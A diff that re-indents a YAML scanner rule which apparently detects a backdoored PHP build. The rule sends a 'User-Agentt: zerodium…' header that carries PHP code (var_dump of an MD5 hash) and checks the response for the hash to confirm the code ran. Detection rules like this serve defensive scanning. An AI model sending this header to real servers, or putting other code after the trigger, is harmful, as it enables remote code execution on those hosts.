@@ -5,7 +5,7 @@ rules:
   - method: GET
     path: /
     headers:
-        User-Agentt: zerodiumvar_dump(md5({{r}}));
+      User-Agentt: zerodiumvar_dump(md5({{r}}));
     follow_redirects: false
     expression: |
       response.status == 200 && response.body.bcontains(bytes(md5(string(r))))
